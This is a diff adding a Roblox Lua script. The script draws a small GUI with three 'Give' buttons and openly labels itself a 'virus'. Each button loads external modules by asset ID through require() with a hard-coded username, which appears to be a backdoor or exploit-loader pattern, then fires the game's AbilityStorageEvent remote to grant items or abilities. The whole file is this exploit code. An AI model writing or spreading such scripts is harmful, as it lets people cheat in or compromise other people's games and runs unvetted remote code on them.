@@ -1,0 +1,48 @@
+local player = game.Players.LocalPlayer
+local virus = "Lolpensilor_Key7"
+local screenGui = Instance.new("ScreenGui")
+local frame = Instance.new("Frame")
+local closeButton = Instance.new("TextButton")
+
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+frame.Size = UDim2.new(0, 200, 0, 200)
+frame.Position = UDim2.new(0.5, -100, 0.5, -100)
+frame.BackgroundColor3 = Color3.new(1, 1, 1)
+frame.Draggable = true
+frame.Active = true
+frame.Parent = screenGui
+
+closeButton.Size = UDim2.new(0, 20, 0, 20)
+closeButton.Position = UDim2.new(1, -25, 0, 5)
+closeButton.Text = "X"
+closeButton.Parent = frame
+closeButton.MouseButton1Click:Connect(function()
+    frame.Visible = false
+end)
+
+local buttonPositions = {30, 75, 120}
+
+for index, i in ipairs({1, 2, 3}) do
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0, 180, 0, 40)
+    button.Position = UDim2.new(0, 10, 0, buttonPositions[index])
+    button.Text = "Give " .. i
+    button.Parent = frame
+    
+    button.MouseButton1Click:Connect(function()
+        local args = { [1] = i }
+        local secretVirusAction = "Executing virus with key: " .. virus
+        print(secretVirusAction)
+        
+        if i == 1 then
+            require(1209580361).no("onlykrd3")
+        elseif i == 2 then
+            require(4839392930).obct2("onlykrd3")
+        elseif i == 3 then
+            require(9383848549).no("onlykrd3")
+        end
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("AbilityStorageEvent"):FireServer(unpack(args))
+    end)
+end
